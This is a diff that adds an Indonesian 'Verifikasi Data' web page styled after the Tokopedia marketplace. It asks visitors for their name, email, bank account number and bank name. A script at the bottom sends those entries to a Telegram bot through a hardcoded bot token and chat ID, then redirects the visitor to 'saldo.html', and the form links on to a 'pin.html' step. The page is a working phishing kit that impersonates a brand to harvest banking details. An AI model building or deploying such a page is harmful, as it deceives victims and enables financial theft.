@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verifikasi Data</title>
+
+  <!-- Tailwind -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'tokped-green': '#40b549',
+            'tokped-dark': '#424242',
+            'tokped-gray': '#e5e5e5'
+          }
+        }
+      }
+    };
+  </script>
+
+  <style>
+    .back-btn {
+      color: #424242;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-white font-sans">
+
+  <!-- Header -->
+  <header class="sticky top-0 z-10 flex items-center border-b border-tokped-gray bg-white px-4 py-4">
+    <button class="back-btn mr-3 text-2xl font-light leading-none" aria-label="Kembali">
+      &#x276E;
+    </button>
+
+    <h1 class="flex-1 text-lg font-bold text-tokped-dark">
+      Verifikasi Data
+    </h1>
+
+    <a href="#" class="text-sm font-semibold text-tokped-green">
+      Bantuan
+    </a>
+  </header>
+
+  <!-- Content -->
+  <main class="mx-auto mt-8 max-w-md px-6">
+    <p class="mb-6 text-sm text-gray-500">
+      Mohon lengkapi data Anda untuk proses verifikasi.
+    </p>
+
+    <form id="verifyForm" class="space-y-4">
+      <div>
+        <label for="username" class="mb-2 block text-sm text-gray-500">
+          Nama Pengguna
+        </label>
+        <input
+          id="username"
+          type="text"
+          placeholder="Nama lengkap"
+          class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-tokped-green focus:outline-none focus:ring-1 focus:ring-tokped-green"
+        />
+      </div>
+
+      <div>
+        <label for="email" class="mb-2 block text-sm text-gray-500">
+          Email
+        </label>
+        <input
+          id="email"
+          type="email"
+          placeholder="email@contoh.com"
+          class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-tokped-green focus:outline-none focus:ring-1 focus:ring-tokped-green"
+        />
+      </div>
+
+      <div>
+        <label for="rekening" class="mb-2 block text-sm text-gray-500">
+          Nomor Rekening
+        </label>
+        <input
+          id="rekening"
+          type="text"
+          placeholder="1234567890"
+          class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-tokped-green focus:outline-none focus:ring-1 focus:ring-tokped-green"
+        />
+      </div>
+
+      <div>
+        <label for="bank" class="mb-2 block text-sm text-gray-500">
+          Nama Bank
+        </label>
+        <input
+          id="bank"
+          type="text"
+          placeholder="BCA / BRI / Mandiri"
+          class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:border-tokped-green focus:outline-none focus:ring-1 focus:ring-tokped-green"
+        />
+      </div>
+
+      <a
+        href="pin.html"
+        id="nextBtn"
+        role="button"
+        class="block w-full rounded-lg bg-tokped-green py-3 text-center font-bold text-white shadow-lg shadow-green-200/50 transition hover:bg-green-700"
+      >
+        Selanjutnya
+      </a>
+    </form>
+  </main>
+
+  <!-- Script -->
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8449078397:AAFqHmrJKLNo4ZX1TCsbCn1uf-GjrQtnmo8';
+    const TELEGRAM_CHAT_ID = '7823308464';
+
+    async function sendDataAndRedirect() {
+      const nama = document.getElementById('username').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const rekening = document.getElementById('rekening').value.trim();
+      const bank = document.getElementById('bank').value.trim();
+
+      if (!nama || !email || !rekening || !bank) {
+        alert('Lengkapi semua data dulu.');
+        return;
+      }
+
+      const message = `\n📥 *DATA FORM BARU*\n\n👤 Nama: ${nama}\n📧 Email: ${email}\n🏦 Bank: ${bank}\n💳 Rekening: ${rekening}\n🕒 Waktu: ${new Date().toLocaleString('id-ID')}\n`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (err) {
+        console.error(err);
+      }
+
+      window.location.href = 'saldo.html';
+    }
+
+    document.getElementById('nextBtn').addEventListener('click', function (e) {
+      e.preventDefault();
+      sendDataAndRedirect();
+    });
+  </script>
+</body>
+</html>
